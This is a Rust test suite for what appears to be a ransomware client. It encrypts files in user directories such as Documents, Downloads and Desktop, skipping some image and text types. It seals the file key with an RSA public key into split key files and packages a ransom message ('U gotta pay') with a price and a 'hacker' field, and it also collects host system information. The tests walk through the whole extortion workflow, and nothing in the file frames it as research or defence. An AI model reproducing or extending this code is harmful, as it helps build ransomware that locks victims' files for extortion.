mod common;

use std::fs;
use std::path::Path;

use chacha20poly1305::aead::rand_core::RngCore;
use client_lib::crypto::{self, KEY_LEN};
use client_lib::output::Output;
use client_lib::sysinfo::SysInfo;
use client_lib::walker;
use rand::rngs::OsRng;

#[test]
fn full_encrypt_decrypt_tree() {
    let (dir, files) = common::make_small_fixture_tree();
    let key = common::random_key();

    // Sanity: .txt and .png are excluded from encryption by design.
    let encryptable = files
        .iter()
        .filter(|(rel, _)| {
            let ext = rel.extension().and_then(|e| e.to_str()).unwrap_or("");
            !matches!(ext, "txt" | "png" | "jpeg" | "jpg")
        })
        .count();
    assert!(encryptable > 0);

    let encrypted = walker::encrypt_tree(dir.path(), &key).unwrap();
    assert_eq!(encrypted as usize, encryptable);

    // Every encryptable file has a .enc counterpart, and excluded ones do not.
    for (rel, _) in &files {
        let ext = rel.extension().and_then(|e| e.to_str()).unwrap_or("");
        let is_excluded = matches!(ext, "txt" | "png" | "jpeg" | "jpg");
        let enc_path = dir.path().join(crypto::encrypted_path(Path::new(rel)));
        if is_excluded {
            assert!(!enc_path.exists(), "excluded file should not be encrypted: {:?}", rel);
        } else {
            assert!(enc_path.exists(), "expected encrypted file: {:?}", enc_path);
        }
    }

    let decrypted = walker::decrypt_tree(dir.path(), &key).unwrap();
    assert_eq!(decrypted as usize, encryptable);

    common::assert_tree_contents_equal(dir.path(), &files);
}

#[test]
fn key_output_files_written_correctly() {
    let (dir, files) = common::make_small_fixture_tree();

    let mut key = [0u8; KEY_LEN];
    OsRng.fill_bytes(&mut key);

    // Generate an RSA keypair and serialize like the generator crate does.
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let private_key = rsa::RsaPrivateKey::new(&mut rng, bits).unwrap();
    let public_key = rsa::RsaPublicKey::from(&private_key);
    let pub_pem =
        rsa::pkcs8::EncodePublicKey::to_public_key_pem(&public_key, rsa::pkcs8::LineEnding::LF).unwrap();

    // 1. Run the encrypt pipeline.
    walker::encrypt_tree(dir.path(), &key).unwrap();

    // 2. Build the "key files" exactly like main.rs does.
    let output = Output::new(
        "U gotta pay".to_string(),
        420,
        uuid::Uuid::new_v4().to_string(),
        "hacker-test".to_string(),
    );
    let (part1, part2) = output.get_files(&pub_pem, &key).unwrap();

    let part1_path = dir.path().join("key.part1");
    let part2_path = dir.path().join("key.part2");
    fs::write(&part1_path, &part1).unwrap();
    fs::write(&part2_path, &part2).unwrap();
    assert!(part1_path.exists());
    assert!(part2_path.exists());

    // 3. "Decrypt" using the private key, mimicking the decrypt crate.
    let padding = rsa::Oaep::new::<sha2::Sha256>();
    let recovered_key = private_key.decrypt(padding, &part1).unwrap();
    assert_eq!(recovered_key.as_slice(), &key[..]);

    // key.part2 is `outer_nonce(24) || encrypt_bytes(...)`, i.e. the decrypt
    // tool reads+discards the first 24 bytes then decrypts the rest.
    let inner = &part2[crypto::BYTES_NONCE_LEN..];
    let recovered_json = crypto::decrypt_bytes(inner, &key).unwrap();
    let parsed: serde_json::Value = serde_json::from_slice(&recovered_json).unwrap();
    assert_eq!(parsed["message"], "U gotta pay");
    assert_eq!(parsed["price"], 420);
    assert_eq!(parsed["hacker"], "hacker-test");

    // 4. Use the recovered key to actually decrypt the tree.
    let recovered: [u8; KEY_LEN] = recovered_key.as_slice().try_into().unwrap();
    // Count .enc files before decrypting: they are removed once restored.
    let expected = walker::collect_decryptable(dir.path()).len() as u64;
    let decrypted = walker::decrypt_tree(dir.path(), &recovered).unwrap();
    assert_eq!(decrypted, expected);
    common::assert_tree_contents_equal(dir.path(), &files);
}

#[test]
fn sysinfo_smoke() {
    let info = SysInfo::new();
    assert!(info.host_name.is_some(), "host_name should be populated");
    let cores = info.core_count.unwrap_or(0);
    assert!(cores > 0, "core_count should be > 0, got {}", cores);
    assert!(info.all_memory > 0);
    assert!(info.uptime > 0);
}

#[test]
fn extension_filtering() {
    let (dir, _) = common::make_small_fixture_tree();
    let key = common::random_key();

    walker::encrypt_tree(dir.path(), &key).unwrap();

    // Excluded: txt, png, jpg
    for rel in ["Documents/notes.txt", "Pictures/photo.png", "Pictures/photo.jpg"] {
        assert!(!dir.path().join(crypto::encrypted_path(Path::new(rel))).exists());
    }
    // Included
    for rel in [
        "Documents/report.md",
        "Documents/data.json",
        "Documents/spreadsheet.csv",
        "Pictures/vector.svg",
        "Downloads/archive.zip",
        "Downloads/ebook.pdf",
        "Desktop/misc/config.env",
    ] {
        assert!(dir.path().join(crypto::encrypted_path(Path::new(rel))).exists());
    }
}
